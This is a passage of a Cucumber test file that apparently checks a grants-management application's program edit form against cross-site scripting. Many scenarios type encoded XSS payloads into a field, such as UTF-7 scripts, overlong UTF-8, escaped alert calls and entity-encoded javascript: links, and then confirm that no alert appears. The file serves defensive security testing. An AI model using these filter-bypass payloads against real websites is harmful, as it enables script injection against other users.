      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301128 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                           | Field                |
      | <meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301132 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value              | Field                |
      | {testData:script1} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301134 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | +/v9+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301138 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | +/v++ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301139 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | +/v/+ADw-script+AD4-alert(1)+ADw-/script+AD4- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301143 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301145 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <iframe sandbox src="//portswigger-labs.net"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301149 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                        | Field                |
      | <meta name="referrer" content="no-referrer"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301151 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                | Field                |
      | %C0%BCscript>alert(1)</script>%E0%80%BCscript>alert(1)</script>%F0%80%80%BCscript>alert(1)</script>%F8%80%80%80%BCscript>alert(1)</script>%FC%80%80%80%80%BCscript>alert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301153 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <script>\u0061lert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301154 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <script>\u{61}lert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301157 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <script>\u{0000000061}lert(1)</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301160 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                | Field                |
      | <script>eval('\x61lert(1)')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301162 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                           | Field                |
      | <script>eval('\141lert(1)')</script>  <script>eval('alert(\061)')</script>  <script>eval('alert(\61)')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301178 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | <a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301181 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                  | Field                |
      | <svg><script>&#97;lert(1)</script></svg>  <svg><script>&#x61;lert(1)</script></svg>  <svg><script>alert&NewLine;(1)</script></svg>  <svg><script>x="&quot;,alert(1)//";</script></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301182 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                         | Field                |
      | <a href="&#0000106avascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
